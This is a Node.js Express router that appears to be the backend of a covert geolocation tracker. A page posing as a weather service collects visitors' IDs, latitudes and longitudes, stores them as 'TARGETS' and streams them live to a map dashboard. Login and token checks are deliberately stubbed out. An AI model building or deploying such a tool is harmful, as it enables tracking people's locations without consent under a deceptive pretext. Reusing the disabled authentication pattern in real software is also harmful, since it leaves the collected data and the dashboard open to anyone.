const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}

// login page bypassed
router.route("/login").get((req, res) => {
    res.redirect("/")
}).post((req, res) => {
    res.redirect("/")
})

router.route("/weather").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    if (TARGETS[id] == null) {
        IO.emit("user-connected", id)
    }

    TARGETS[id] = [lat, lng]
    IO.emit("map-data", { id, lat, lng })
    res.send("OK")
    console.log(`> ${id} - ${TARGETS[id]}`)
})

// token checking bypassed
router.use(function checkToken(req, res, next) {
    next()
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    res.render("map", {
        data: TARGETS[id]
    })
})


module.exports = router